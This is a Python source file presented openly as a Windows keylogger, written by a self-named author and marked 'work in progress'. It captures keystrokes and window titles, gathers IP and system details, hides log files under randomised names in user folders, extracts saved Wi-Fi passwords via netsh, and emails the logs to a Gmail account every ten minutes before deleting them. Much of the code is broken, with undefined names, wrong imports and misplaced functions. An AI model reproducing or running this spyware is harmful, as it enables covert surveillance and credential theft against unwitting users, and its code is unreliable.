import time, os, random, requests, socket, win32gui, sys, platform, gui
import random, string, datetime, smtp, traceback, threading
import re, subprocess
from subprocess import Popen, call, run, PIPE
from pyinput.keyboard import key, Listener
from datetime import datetime
from . import config
from config import *
from . import colors
from colors import all
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import threading


## work in progress, current build: running.
##########################################################
# simple_keylogging script
# currently embedds as a file in random/obfuscated file
# collects os, kernal and sys info and
# rips known windows AP and Passwords (no need to bruteforce)
# Still need to:
## to replace print statemetns add socks later
## to add better file obfuscration later.
## to class 'emailer' and wifi reipper for better readibilty
## CONFIG .PY
## copyleft, all wrongs reserved to adel al
############################################################

'''Change the config settings to your own
  fromAddr = 'example@gmail.com'
  fromPswd = 'example_password' '''

### add hashing function for added protection.





class Colors:
    reset = "\033[0m"

    # Black
    fgBlack = "\033[30m"
    fgBrightBlack = "\033[30;1m"
    bgBlack = "\033[40m"
    bgBrightBlack = "\033[40;1m"

    # Red
    fgRed = "\033[31m"
    fgBrightRed = "\033[31;1m"
    bgRed = "\033[41m"
    bgBrightRed = "\033[41;1m"

    # Green
    fgGreen = "\033[32m"
    fgBrightGreen = "\033[32;1m"
    bgGreen = "\033[42m"
    bgBrightGreen = "\033[42;1m"

    # Yellow
    fgYellow = "\033[33m"
    fgBrightYellow = "\033[33;1m"
    bgYellow = "\033[43m"
    bgBrightYellow = "\033[43;1m"

    # Blue
    fgBlue = "\033[34m"
    fgBrightBlue = "\033[34;1m"
    bgBlue = "\033[44m"
    bgBrightBlue = "\033[44;1m"
    # Magenta
    fgMagenta = "\033[35m"
    fgBrightMagenta = "\033[35;1m"
    bgMagenta = "\033[45m"
    bgBrightMagenta = "\033[45;1m"
    # Cyan
    fgCyan = "\033[36m"
    fgBrightCyan = "\033[36;1m"
    bgCyan = "\033[46m"
    bgBrightCyan = "\033[46;1m"
    # White
    fgWhite = "\033[37m"
    fgBrightWhite = "\033[37;1m"
    bgWhite = "\033[47m"
    bgBrightWhite = "\033[47;1m"


###########
color = Colors()
spinner = Spinner()
yellow = color.fgYellow
red = color.fgRed
blue = color.fgBlue
bblue = color.fgBrightBlue
cyan = color.fgCyan
bg_background = color.bgBlack
reset = color.reset


def clear():
    # check and make call for specific operating system
    os_name = platform.system()
    _ = call('clear' if os_name == 'Linux' or 'Windows' or 'Darwin' else 'cls')

## establish keyworld obj/values for later in the script.
substitution = ['Key.enter', '[ENTER]\n', 'Key.backspace', '[BACKSPACE]', 'Key.space', ' ',
                'Key.alt_l', '[ALT]', 'Key.tab', '[TAB]', 'Key.delete', '[DEL]', 'Key.ctrl_l', '[CTRL]',
                'Key.left', '[LEFT ARROW]', 'Key.right', '[RIGHT ARROW]', 'Key.shift', '[SHIFT]', '\\x13',
                '[CTRL-S]', '\\x17', '[CTRL-W]', 'Key.caps_lock', '[CAPS LK]', '\\x01', '[CTRL-A]', 'Key.cmd',
                '[WINDOWS KEY]', 'Key.print_screen', '[PRNT SCR]', '\\x03', '[CTRL-C]', '\\x16', '[CTRL-V]']

current_time = time.ctime(time.time())
datetime = datetime.now()
extIP = requests.get('https://api.ipify.org').text()
pvtIP = socket.gethostbyname(socket.gethostname())
user = os.path.expanduser('~').split('\\')[2]

if 'win32' not in platform.platform:
    print(f'[+] OS Must Be Win32. GOODBYE!')
    time.sleep(1)
    sys.exit(1)

print(pvtIP)
print(user)

msg = f'[START OF LOGS]\n  *~ Date/Time: {datetime}\n  *~ User-Profile: {user}\n  *~ Public-IP: {extIP}\n  *~ Private-IP: {pubIP}\n\n'
logged_data = []
logged_data.append(msg)
old_app = ''
rm_file = []


## establish
def on_press():
    global old_app
    new_app = win32gui.GetWindowText(win32gui.GetForegroundWindow())
    if new_app == 'Cortana':
        new_app = 'Windows Start Menu'
        key = str(key).strip('\n')
        if key in substitution:
            logged_data.append(substitution[substitution.index(key) + 1])
        else:
            logged_data.append(f'[!] Listening.. {time.time()}')


# create files in random folder, and obfuscate filename
# creates a list, with random choice for hidden path.
# adds OS.function to make file hidden

def write_txt(*args):
    global count
    count = 0
    ## logic for simple file path/name obfuscation
    print(f'[+] **Starting Write Function [+]\n {key}')

    hidden_path = []
    user_dir = os.path.expanduser('~')
    if os.path.isdir(user_dir + '/Documents/'):
        chance_one = os.path.expanduser('~') + '/Documents/'
        hidden_path.append(chance_one)
    if os.path.isdir(user_dir + '/Pictures/'):
        chance_two = os.path.expanduser('~') + '/Pictures/'
        hidden_path.append(chance_two)
    if os.path.isdir(user_dir + '/AppData/'):
        chance_three = os.path.expanduser('~') + '/AppData/'
        hidden_path.append(chance_three)
    else:
        print('[-] $Userhome does not contain common dirs found in win32.')
        sys.exit(1)

    filepath = str(random.choice(hidden_path))
    file_time = datetime.now
    key_vals = list(string.printable)
    keys = random.sample(key_vals, 6)
    hidden_file = str(keys) + str(random.randint(10000000, 999999)) + str(file_time) + str(keys) + 'txt'
    print(f'[+] [Hidden Path] [+]\n {hidden_path}')
    print(f'[+] [Hidden File Location] [+]\n [{filepath}]')
    print(f'[+] Hidden File Absolute] [+] \n [{hidden_file}]')
    rm_file = [hidden_file]  ## to remove later

    def get_sysInfo():
        try:
            width = os.get_terminal_size()
            terminal = os.environ.get('TERM')
            width_len = width
            cwd = os.getcwd()
            IP_INFO = f"\033[1;35;0m {IPx.IP}"
            current_version = platform.release()
            system_info = platform.platform()
            os_name0 = platform.system()
            current_platform = platform.system()
            platform_name = sys.platform
            ## new adds
            big_names = platform.uname()
            processor = platform.processor()
            architecture = platform.architecture()
            user_id = os.uname()
            login = os.getlogin()

            print()
            print('X' * 50)
            print(f'**[SYSTEM INFO]**'.center(width))
            print()
            print(f'\033[1;35;m [CURRENT_PLATFORM]--[{current_platform}]  ...? '.center(width))
            print(f'\033[1;35;m [PLATFORM_NAME]--[{platform_name}]  ...? '.center(width))
            print(f'\033[1;35;m [CURRENT_VERSION]--[{current_version}]  ...? '.center(width))
            print(f'\033[1;35;m [OS-NAME]--[{os_name0}] + [{terminal}] ...? '.center(width))
            print(f'\033[1;35;m [SYSTEM-INFO]--[{system_info}]  ...? '.center(width))
            print(f'\033[1;35;0m [CURRENT-VERSION]--[{current_version}]  ...? '.center(width))
            print(f'\033[1;35;0m [UUID]--[{big_names}]  ...? '.center(width))
            print(f'\033[1;35;0m [PROCESSOR]--[{processor}]  ...? '.center(width))
            print(f'\033[1;35;0m [ARCHITECTURE]--[{architecture}]  ...? '.center(width))
            print(f'\033[1;35;0m [USER-ID]--[{user_id}]  ...? '.center(width))
            print(f'\033[1;35;0m [LOGIN]--[{login}]  ...? '.center(width))
            print('X' * 50)

            current_platform = platform.system()
            platform_name = sys.platform
            while True:
                print(f'{yellow}[CHECKING OS]{reset}')
                if 'Darwin' in current_platform:
                    print(
                        f'{red} Your OS [{current_platform}] || [{platform_name}] \n* You may run into a few issues-**{reset}')
                    period_wait()
                    clear()
                    break
                elif 'Windows' in current_platform:
                    print(f'{red} Your OS [{current_platform}] || [{platform_name}] sucks. \n**FUCK-WINDOWS-**{reset}')
                    period_wait()
                    clear()
                    break
                elif 'Linux' in current_platform or 'Ubuntu' in current_platform or 'Kali' in current_platform:
                    print(f'[DETECTED LINUX]')
                    print(f'{yellow}**Your OS [{current_platform}] || Platform [{platform_name}]')
                    period_wait()
                    clear()
                    break

                with open(hidden_file, 'a') as f:
                    f.write(''.join(logged_data) + '\n')

        except Exception as E:
            traceback.print_exc()
            print(str(E))
            pass

        def get_wifiPass():
            command_output = subprocess.run(['netsh', 'wlan', 'show', 'profile'], capture_output=True).stdout.decode()
            if not command_output:
                print(f'[+] [ERROR IN STARTING NETSH DAEMON] [+] ')
            print(f'[+] [netsh daemon turned on and running] [+] ')
            profile_names = re.findall(r'\bf[a-z]*', command_output)
            print(f'[SYSTEM] Current Profile Names \n {profile_names}')
            print(f'[SYSTEM].. Creating list with  Profile Names + passwords \n')
            wifi_list = []

            if len(profile_names) != 0:
                for name in profile_names:
                    wifi_profile = dict()
                    profile_info = subprocess.run(['netsh', 'wlan', 'show', 'profile', name], capture_output=True).stdout.decode()
                    print(profile_info)
                    if re.search("Security: Absent", profile_info):
                        continue
                ## stage the key values for dict
                    else:
                        wifi_profile['SSID'] = name
                        profile_pass = subprocess.run(['netsh', 'wlan', 'show', 'profile', name], capture_output=True).stdout.decode()  # continues the loop
                        password = re.search(":Key Content      :(.*)\r")
                    if password is None:
                        #wifi_profile["password"] = None
                        wifi_profile["password"] = 'NULL'
                    else:
                        wifi_profile["password"] = password[1]
                        wifi_list.append(wifi_profile)

            for x in range(len(wifi_list)):
                print(wifi_list[x])


def send_logs(*args):
    log_count = 0
    fromAddr = config.fromAddr
    fromPwd = config.frompwd
    toAddr = fromAddr
    MIN = 10
    SECONDS = 60
    time.sleep(MIN * SECONDS)  # every 10 mins write file/send log
    print(f'[+] Email Logger is set to \n[ADDR] [{fromAddr}]')
    while True:
        if len(logged_data) > 1:
            try:
                write_txt(count)
                subject = f'[{user}] ~ {count}'
                msg = MIMEMultipart()
                msg['From'] = fromAddr
                msg['To'] = toAddr
                msg['Subject'] = subject
                body = 'testing'
                msg.attach(MIMEText(body, 'plain'))
                attachment = open(rm_file[0], 'rb')
                print('attachment')
                filename = rm_file[0].split('/')[2]
                part = MIMEBase('application', 'octect-stream')
                part.set_payload((attachment).read())
                encoders.encode_base64(part)
                part.add_header('content-disposition', 'attachment;filename=' + str(filename))
                msg.attach(part)
                text = msg.as_string()
                print('test msg.as_string')
                s = smtplib.SMTP('smtp.gmail.com', 587)
                s.ehlo()
                s.starttls()
                print('starttls')
                s.ehlo()
                s.login(fromAddr, fromPwd)
                s.sendmail(fromAddr, toAddr, text)
                print('sent mail')
                attachment.close()
                s.close()
                os.remove(rm_file[0])
                del logged_data[1:]
                del rm_file[0:]
                print(f'[+] delete data/files')
                log_count += 1

            except Exception as errorString:
                print('[!] send_logs // Error.. ~ %s' % (errorString))
                print(traceback.print_exc)
                pass
            except:
                pass

## set logging thread and Listener context manager.
def main():
    print(f'{red}\t\t[+]-[+] copyleft material from Adel Al [+]-[+] All Wrongs Reserved. [+]-[+] {reset}')
    t1 = threading.Thread(target=send_logs)
    t1.start()
    with Listener(on_press=on_press) as listener:
        listener.join()


if __name__ == '__main__':
    main()


